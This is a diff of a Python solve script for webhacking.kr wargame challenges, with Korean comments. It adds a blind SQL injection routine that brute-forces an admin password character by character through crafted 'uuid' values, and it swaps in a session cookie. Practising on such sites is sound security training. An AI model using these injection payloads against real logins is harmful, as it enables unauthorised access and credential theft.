@@ -3,7 +3,7 @@ import hashlib
 url="https://webhacking.kr/challenge/web-31/rank.php?score=1%20and%20"
 
 
-cookie={"PHPSESSID":"c9e8hno27k6mhlp8m7j3f35rmm"}
+cookie={"PHPSESSID":"eldl4tjjv0gaivmrgjmgujb6hm"}
 session=requests.Session()
 
 password=""
@@ -103,3 +103,23 @@ for i in range(1,12): #IF(LENGTH(id)LIKE(길이),3,5) 로 길이를 먼저 알�
 print(passwd) #alsrkswhaql
 '''
 
+passwd=""
+url="https://webhacking.kr/challenge/bonus-2/index.php"
+'''
+payload = session.post(url, data={"uuid": "asz' or length(pw)=32#", "pw": "asaa"},cookies=cookie)
+if ("Wrong password!" in payload.text):
+    print("correct!!!!!!!")
+
+for i in range(1,33): #원래는 1 부터 길이+1 까지
+    for j in range(33, 127): #hex변환할 글자 33 = !, 126 = ~(전까지) format(j,'x')
+
+        payload=session.post(url,data={"uuid":"admin' and ascii(substr(pw,"+str(i)+",1))="+hex(j)+"#","pw":""},cookies=cookie)
+        print(url+" / uuid : admin' and substr(pw,"+str(i)+",1)="+chr(j)+" : "+hex(j)+"#" +"  pw : ")
+        if ("Wrong password!" in payload.text):
+            print(chr(j) + " is correct!!!!!!!")
+            passwd += chr(j)
+            passwd += " "
+            print(passwd)
+
+print(passwd)
+'''
